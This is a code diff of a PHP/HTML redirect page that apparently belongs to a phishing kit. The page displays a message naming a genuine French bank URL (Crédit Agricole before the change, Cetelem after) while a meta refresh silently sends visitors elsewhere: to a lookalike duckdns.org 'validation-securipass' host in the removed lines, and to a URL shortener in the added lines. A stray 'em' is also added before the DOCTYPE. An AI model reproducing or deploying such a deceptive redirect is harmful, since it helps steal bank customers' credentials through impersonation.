@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+em<!DOCTYPE html>
 
 <html>
 
@@ -10,8 +10,8 @@
 <body>
 
 <?php
-   echo("redirection vers https://www.credit-agricole.fr/activationdsp2s...")     ;
- echo "<META HTTP-EQUIV='Refresh' Content=0;URL='https://activ-partculier-ca.duckdns.org/validation-securipass'>";
+   echo("redirection vers https://www.cetelem.fr/activatio-cpaybiometrie...")     ;
+ echo "<META HTTP-EQUIV='Refresh' Content=0;URL='https://kutt.it/QqJpAU'>";
 ?>
 
 
